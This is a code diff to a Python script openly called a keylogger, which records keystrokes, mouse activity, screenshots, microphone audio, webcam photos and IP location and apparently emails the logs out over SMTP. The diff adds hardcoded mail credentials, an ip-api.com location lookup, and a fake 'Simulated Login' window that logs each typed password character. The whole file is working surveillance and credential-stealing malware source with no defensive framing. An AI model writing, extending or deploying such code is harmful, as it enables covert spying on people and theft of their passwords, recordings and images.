@@ -8,14 +8,14 @@ import wave
 import pyscreenshot
 import sounddevice as sd
 import cv2
-import geocoder
+import requests
+import tkinter as tk
 from pynput import keyboard, mouse
 from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
 
-# ✅ Mailtrap SMTP Credentials
-EMAIL_ADDRESS = "Your_UserName"  # Replace with your Mailtrap username
-EMAIL_PASSWORD = "Your_Passwor"  # Replace with your Mailtrap password
+EMAIL_ADDRESS = "5d3e92d05a2cbd"
+EMAIL_PASSWORD = "617b2f03776f9a"
 SMTP_SERVER = "sandbox.smtp.mailtrap.io"
 SMTP_PORT = 2525
 
@@ -92,8 +92,8 @@ class KeyLogger:
 
     def record_microphone(self):
         try:
-            fs = 44100  # Sample rate
-            duration = 10  # Seconds
+            fs = 44100
+            duration = 10
             recording = sd.rec(int(duration * fs), samplerate=fs, channels=2, dtype='int16')
             sd.wait()
             wave_file = wave.open("recorded_audio.wav", 'wb')
@@ -119,19 +119,36 @@ class KeyLogger:
         threading.Timer(self.interval, self.capture_webcam_photo).start()
 
     def save_location_to_file(self, location):
-        """ Save location data to a separate file """
         with open("geo_location_log.txt", "a") as file:
             file.write(location + "\n")
 
     def get_location(self):
         try:
-            g = geocoder.ip('me')
-            location_info = f"Location: {g.city}, {g.state}, {g.country}, {g.latlng}"
+            res = requests.get("http://ip-api.com/json")
+            data = res.json()
+            location_info = f"Location: {data['city']}, {data['regionName']}, {data['country']} | Lat/Lon: {data['lat']}, {data['lon']}"
             self.append_log(location_info)
-            self.save_location_to_file(location_info)  # Save location separately
+            self.save_location_to_file(location_info)
         except Exception as e:
             self.append_log(f"[-] Location Tracking Failed: {e}")
         threading.Timer(self.interval, self.get_location).start()
+
+    def simulate_password_field(self):
+        def log_keystroke(event):
+            self.append_log(f"Password Field Input: {event.char}")
+
+        def on_submit():
+            self.append_log("[+] Simulated password entry submitted.")
+            root.destroy()
+
+        root = tk.Tk()
+        root.title("Simulated Login")
+        tk.Label(root, text="Enter your password:").pack()
+        password_entry = tk.Entry(root, show='*')
+        password_entry.pack()
+        password_entry.bind("<Key>", log_keystroke)
+        tk.Button(root, text="Submit", command=on_submit).pack()
+        root.mainloop()
 
     def run(self):
         print("[+] Keylogger Running...")
@@ -143,12 +160,16 @@ class KeyLogger:
             self.report()
             self.capture_webcam_photo()
             self.get_location()
+            self.simulate_password_field()
             keyboard_listener.join()
             mouse_listener.join()
 
-# ✅ Start the Keylogger
+# === EXECUTION ===
+
 keylogger = KeyLogger(SEND_REPORT_EVERY, EMAIL_ADDRESS, EMAIL_PASSWORD)
 keylogger.capture_system_info()
 keylogger.capture_screenshot()
 keylogger.record_microphone()
 keylogger.run()
+
+#python keylogger.py
